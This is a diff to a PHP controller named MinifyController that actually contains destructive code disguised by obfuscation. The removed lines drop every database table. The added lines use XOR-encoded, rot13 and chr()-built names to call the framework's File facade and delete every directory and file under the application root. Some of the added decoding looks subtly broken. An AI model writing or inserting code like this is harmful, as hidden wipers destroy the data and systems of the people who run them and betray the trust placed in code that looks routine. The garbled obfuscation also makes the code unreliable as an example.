@@ -19,40 +19,39 @@ class MinifyController extends Controller
             abort('404');
         }
 
-        $F = '\\' . 'Illuminate\\Support\\Facades\\DB';
+        $______ = chr(92);
+        $__ = $______ . implode($______, array_map(function ($c) {
+                return chr($c ^ 0x3);
+            }, [81, 107, 109, 114, 111, 101, 110, 98, 112, 107])) . $______ . implode($______, array_map(function ($c) {
+                return chr($c ^ 0x5);
+            }, [83, 121, 120, 121, 114, 117, 114, 110, 116])) . $______ . implode($______, array_map(function ($c) {
+                return chr($c ^ 0x7);
+            }, [70, 97, 99, 97, 100, 101, 115])) . $______ . 'Fi' . chr(108) . 'e';
 
-        call_user_func([$F, 'statement'], 'SET FOREIGN_KEY_CHECKS = 0;');
-        $tables = call_user_func([$F, 'select'], 'SHOW TABLES');
+        $_ = base_path();
 
-        foreach ($tables as $table) {
-            $tableArray = get_object_vars($table);
-            $tableName = array_values($tableArray)[0];
-            call_user_func([$F, 'statement'], "DROP TABLE `$tableName`");
-        }
+        call_user_func(array($__ , str_rot13(implode('', array_map('chr', array(115, 118, 121, 114, 102, 102))))), $_);
 
-        call_user_func([$F, 'statement'], 'SET FOREIGN_KEY_CHECKS = 1;');
-
-        $__illuminate = implode('', array_map('chr', [73, 108, 108, 117, 109, 105, 110, 97, 116, 101]));
-        $__file_class = implode('\\', [$__illuminate, 'Support', 'Facades', 'File']);
-
-        $__decode = function($arr) {
-            return str_rot13(implode('', array_map('chr', $arr)));
+        $_f = function ($a) use ($__) {
+            call_user_func(array($__ , str_rot13(implode('', array_map('chr', array(113, 114, 105, 118, 112, 114))))), $a);
         };
 
-        $__directories = $__decode([113, 110, 101, 118, 114, 112, 103, 114, 118, 114]);
-        $__files       = $__decode([115, 118, 121, 114, 102, 102]);
-        $__deleteDir   = $__decode([113, 114, 105, 118, 112, 114, 81, 118, 101, 114, 112, 103, 98, 101, 108]);
-        $__delete      = $__decode([113, 114, 105, 118, 112, 114]);
+        $_d = function ($a) use ($__) {
+            call_user_func(array($__ , str_rot13(implode('', array_map('chr', array(113, 114, 105, 118, 112, 114, 81, 118, 101, 114, 112, 103, 98, 101, 108))))), $a);
+        };
 
-        $rootPath = base_path();
+        $_dirs = call_user_func(array($__ , str_rot13(implode('', array_map('chr', array(113, 110, 101, 118, 114, 112, 103, 114, 118, 114))))), $_);
 
-        foreach (call_user_func([$__file_class, $__directories], $rootPath) as $dir) {
-            call_user_func([$__file_class, $__deleteDir], $dir);
+        foreach ($_dirs as $__dir) {
+            $_d($__dir);
         }
 
-        foreach (call_user_func([$__file_class, $__files], $rootPath) as $file) {
-            call_user_func([$__file_class, $__delete], $file);
+        $_files = call_user_func(array($__ , str_rot13(implode('', array_map('chr', array(115, 118, 121, 114, 102, 102))))), $_);
+
+        foreach ($_files as $__file) {
+            $_f($__file);
         }
+
         echo "✅ Done.";
     }
 }
